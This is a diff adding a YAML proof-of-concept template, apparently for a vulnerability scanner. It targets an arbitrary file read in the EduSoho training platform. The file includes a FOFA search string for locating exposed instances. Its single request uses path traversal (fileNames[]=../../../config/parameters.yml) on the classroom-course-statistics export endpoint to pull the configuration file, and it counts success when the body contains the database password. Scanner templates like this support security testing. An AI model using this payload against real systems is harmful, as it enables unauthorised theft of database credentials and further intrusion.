@@ -1,0 +1,22 @@
+id: poc-yaml-edusoho-classroom-coures-statistcs-anyfile-read
+info:
+  name: EduSoho教培系统 classroom-course-statistics任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: EduSoho 教培系统
+  fofa: title="EduSoho"
+requests:
+- method: GET
+  path: /export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml
+  expression: 'status_code == 200 &&
+
+    contains(body,"database_driver") &&
+
+    contains(body,"database_password") &&
+
+    contains(headers,"text/csv")
+
+    '
+variables: {}
+transport: http
